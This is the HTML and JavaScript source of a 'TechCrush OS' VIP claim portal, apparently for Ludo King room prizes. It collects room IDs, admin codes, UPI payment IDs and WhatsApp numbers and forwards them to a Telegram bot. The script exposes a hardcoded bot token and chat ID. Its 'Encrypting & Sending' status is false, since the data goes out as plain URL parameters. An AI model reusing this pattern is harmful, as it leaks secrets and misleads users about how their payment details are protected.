<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TechCrush Claims</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;700&display=swap" rel="stylesheet">
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    fontFamily: { sans: ['Outfit', 'sans-serif'] },
                    animation: { 'pulse-slow': 'pulse 4s cubic-bezier(0.4, 0, 0.6, 1) infinite' }
                }
            }
        }
    </script>
    <style>
        /* GOLDEN EDITION THEME */
        body {
            /* Added warmth (amber/gold) to the top right corner */
            background: radial-gradient(circle at top right, rgba(202, 138, 4, 0.15), transparent 50%),
                        radial-gradient(circle at top left, #1e1b4b, #020617, #000000);
            color: white;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        /* GLASS CARD */
        .glass-card {
            background: rgba(30, 41, 59, 0.5);
            backdrop-filter: blur(24px);
            -webkit-backdrop-filter: blur(24px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            padding: 30px;
            border-radius: 24px;
            width: 100%;
            max-width: 360px;
            box-shadow: 0 20px 50px -12px rgba(0, 0, 0, 0.8);
            position: relative;
            overflow: hidden;
        }

        /* GOLDEN GLOW AT TOP */
        .glass-card::before {
            content: '';
            position: absolute;
            top: 0; left: 0; right: 0;
            height: 2px;
            /* Changed to Gold */
            background: linear-gradient(90deg, transparent, #facc15, transparent);
            opacity: 0.8;
            box-shadow: 0 0 20px #facc15;
        }

        /* INPUTS */
        .input-group { position: relative; margin-bottom: 20px; }
        .input-box {
            background: rgba(2, 6, 23, 0.6);
            border: 1px solid rgba(71, 85, 105, 0.5);
            color: white;
            padding: 14px 16px;
            border-radius: 12px;
            width: 100%;
            font-size: 15px;
            transition: all 0.3s ease;
            font-weight: 500;
        }
        /* Golden Focus Color */
        .input-box:focus {
            border-color: #eab308; /* Yellow-500 */
            background: rgba(2, 6, 23, 0.9);
            box-shadow: 0 0 0 4px rgba(234, 179, 8, 0.1);
            outline: none;
        }
        .input-label {
            position: absolute;
            top: -8px;
            left: 12px;
            background: #020617;
            padding: 0 6px;
            font-size: 11px;
            color: #eab308; /* Yellow Text */
            font-weight: 700;
            border-radius: 4px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        /* GOLDEN BUTTON Gradient */
        .btn-submit {
            /* Purple to Gold Gradient */
            background: linear-gradient(135deg, #7c3aed 0%, #f59e0b 100%);
            color: white;
            font-weight: 800;
            padding: 16px;
            border-radius: 14px;
            width: 100%;
            border: none;
            cursor: pointer;
            transition: all 0.2s;
            font-size: 15px;
            box-shadow: 0 4px 20px rgba(245, 158, 11, 0.3);
            letter-spacing: 1px;
            position: relative;
            overflow: hidden;
            text-shadow: 0 1px 2px rgba(0,0,0,0.2);
        }
        .btn-submit:active { transform: scale(0.98); }
        .btn-submit:disabled { background: #334155; box-shadow: none; cursor: not-allowed; opacity: 0.7; }

        /* HELP BUTTON */
        .help-pill {
            position: absolute;
            top: 20px;
            right: 20px;
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.1);
            color: #94a3b8;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 11px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
        }
        .help-pill:hover { border-color: #facc15; color: #facc15; }

        /* HEADER - Gold Gradient Text */
        .brand-title {
            font-size: 26px;
            font-weight: 900;
            background: linear-gradient(to right, #facc15, #ffffff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 5px;
            letter-spacing: -0.5px;
        }

        /* MODAL */
        .modal-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); backdrop-filter: blur(8px); z-index: 999; align-items: center; justify-content: center; padding: 20px; }
        .modal-box { background: #0f172a; border: 1px solid rgba(250, 204, 21, 0.2); padding: 30px; border-radius: 24px; text-align: center; max-width: 320px; width: 100%; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.9); }
        .btn-close { background: #334155; color: white; padding: 12px; width: 100%; border-radius: 12px; font-weight: 700; font-size: 14px; margin-top: 20px; }
    </style>
</head>
<body>

    <div id="helpModal" class="modal-overlay">
        <div class="modal-box">
            <div class="w-12 h-12 bg-yellow-500/20 rounded-full flex items-center justify-center mx-auto mb-4 text-2xl text-yellow-400">‚ÑπÔ∏è</div>
            <h2 class="text-xl font-bold text-white mb-4">Verification Steps</h2>
            <div class="text-left text-sm text-gray-300 space-y-3 bg-slate-950/50 p-4 rounded-xl border border-yellow-900/30">
                <p>1Ô∏è‚É£ Copy Room ID from Ludo King.</p>
                <p>2Ô∏è‚É£ Enter Secret Code from Admin.</p>
                <p>3Ô∏è‚É£ Provide correct WhatsApp No.</p>
            </div>
            <button onclick="toggleHelp(false)" class="btn-close hover:bg-slate-600 hover:text-yellow-400 transition-colors">Understood</button>
        </div>
    </div>

    <div id="successModal" class="modal-overlay">
        <div class="modal-box" style="border-color: #10b981; background: #022c22;">
            <div class="w-16 h-16 bg-green-500/20 rounded-full flex items-center justify-center mx-auto mb-4 animate-bounce">
                <span class="text-3xl">‚úÖ</span>
            </div>
            <h2 class="text-xl font-bold text-white mb-2">Claim Submitted</h2>
            <p class="text-sm text-green-200">Admin has received your details.<br>Verification takes 5-10 mins.</p>
            <button onclick="location.reload()" class="btn-close bg-green-600 hover:bg-green-700 border-none">Close</button>
        </div>
    </div>

    <div class="glass-card">
        <div onclick="toggleHelp(true)" class="help-pill">Need Help?</div>
        
        <div class="mb-8 mt-2">
            <h1 class="brand-title">TechCrush OS</h1>
            <p class="text-xs text-yellow-500/80 font-bold tracking-widest uppercase">VIP Claim Portal</p>
        </div>

        <div class="input-group">
            <label class="input-label">Room ID</label>
            <input type="number" id="roomId" placeholder="5829103" class="input-box text-white font-mono tracking-widest">
        </div>

        <div class="input-group">
            <label class="input-label">Secret Code</label>
            <input type="text" id="secretCode" placeholder="A-5" class="input-box text-white font-mono uppercase font-bold text-yellow-400">
        </div>

        <div class="input-group">
            <label class="input-label">UPI ID</label>
            <input type="text" id="upiId" placeholder="rahul@ybl" class="input-box">
        </div>

        <div class="input-group">
            <label class="input-label">WhatsApp Number</label>
            <input type="tel" id="phoneNo" placeholder="9876543210" maxlength="10" class="input-box font-bold">
        </div>

        <button onclick="finalSubmit()" id="submitBtn" class="btn-submit">
            SUBMIT CLAIM ‚ûú
        </button>
        
        <p id="statusTxt" class="text-[10px] text-gray-400 text-center mt-4 h-4"></p>
    </div>

    <script>
        // ‚úÖ YOUR CONFIGURED KEYS (Do not change)
        const BOT_TOKEN = "8282973003:AAETkx8usebo7SyMgQ_m1BOTXCTNR35khqw"; 
        const CHAT_ID = "8341202481";     

        function toggleHelp(show) {
            document.getElementById('helpModal').style.display = show ? 'flex' : 'none';
        }

        async function finalSubmit() {
            const id = document.getElementById('roomId').value.trim();
            const code = document.getElementById('secretCode').value.trim().toUpperCase();
            const upi = document.getElementById('upiId').value.trim();
            const phone = document.getElementById('phoneNo').value.trim();
            const btn = document.getElementById('submitBtn');
            const status = document.getElementById('statusTxt');

            if(!id || !code || !upi || !phone) { 
                status.innerText = "‚ö†Ô∏è Please complete all fields.";
                status.className = "text-[10px] text-red-400 text-center mt-4 h-4";
                return; 
            }

            // Button Loading State (Golden Spinner)
            btn.disabled = true;
            btn.innerHTML = `<svg class="animate-spin h-5 w-5 mx-auto text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path></svg>`;
            status.innerText = "Encrypting & Sending...";
            status.className = "text-[10px] text-yellow-300 text-center mt-4 h-4 animate-pulse";

            // Click-to-Copy Format
            const message = `üèÜ *NEW CLAIM* \n\n` + 
                            `üÜî Room: \`${id}\` \n` + 
                            `üîê Code: \`${code}\` \n` + 
                            `üí∞ UPI: \`${upi}\` \n` + 
                            `üìû Phone: \`${phone}\``;

            try {
                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
                
                const response = await fetch(url);
                
                if(response.ok) {
                    document.getElementById('successModal').style.display = 'flex';
                } else {
                    const err = await response.json();
                    alert("System Error: " + err.description);
                    resetBtn();
                }
            } catch(e) {
                alert("Connection Failed. Check your internet.");
                resetBtn();
            }
        }

        function resetBtn() {
            const btn = document.getElementById('submitBtn');
            btn.disabled = false;
            btn.innerHTML = "SUBMIT CLAIM ‚ûú";
            document.getElementById('statusTxt').innerText = "";
        }
    </script>
</body>
</html>
